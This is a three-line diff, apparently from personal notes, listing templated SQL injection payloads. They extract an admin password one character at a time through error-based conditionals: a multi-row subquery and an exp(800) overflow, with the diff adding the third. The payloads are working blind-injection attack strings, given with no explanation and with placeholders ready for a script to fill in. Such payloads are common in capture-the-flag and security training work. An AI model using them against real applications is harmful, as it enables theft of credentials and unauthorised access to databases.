@@ -1,2 +1,3 @@
 0.' or if(ord(substr({pw},{i},1))={j},( select 1 union select 2),1)-- -
 1.'or id = 'admin' and (select 1 union select ord(substr({pw},{i},1))={j})-- -
+2.exp(800*if(id="admin" and ord(substr({pw},{i},1))={j} , 1, 0))
